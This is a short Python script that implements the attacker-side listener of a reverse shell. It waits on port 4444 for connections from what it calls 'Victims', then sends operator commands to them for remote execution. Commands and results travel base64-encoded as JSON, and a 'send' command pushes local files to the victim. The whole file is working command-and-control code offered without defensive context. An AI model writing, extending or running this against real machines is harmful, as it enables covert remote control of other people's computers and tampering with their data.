import socket
import json
import base64


class Listener:
    def __init__(self, host, port):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((host, port))
            s.listen(5)

            print(
                "[+] Listening for incoming Victims on Host {} and Port {}...".format(host, port))

            self.connection, address = s.accept()
            print("[+][+] Got a connection from -> " + str(address))

    def send(self, data):
        encoded_data = base64.b64encode(json.dumps(data).encode())
        self.connection.send(encoded_data)

    def receive(self):
        while True:
            try:
                decode_data = base64.b64decode(
                    self.connection.recv(4096)).decode("UTF-8")
                if not decode_data:
                    break
                return decode_data

            except ValueError:
                continue

    def remote_execute(self, command):
        self.send(command)
        return self.receive()

    def read_file(self, path):
        with open(path, "r") as file:
            # return base64.b64encode(file.read())
            return file.read()

    def Run(self):
        while self.connection:
            command = input("Command ->> ")
            command = command.split(" ")

            if command[0] == "send":
                file_content = self.read_file(command[1])
                command.append([file_content])

            result = self.remote_execute(command)
            print(result)


def main():
    hostname = socket. gethostname()
    HOST = socket. gethostbyname(hostname)
    PORT = 4444       # Port to listen on
    Attacker = Listener(HOST, PORT)

    print(HOST)

    Attacker.Run()


if __name__ == "__main__":
    main()
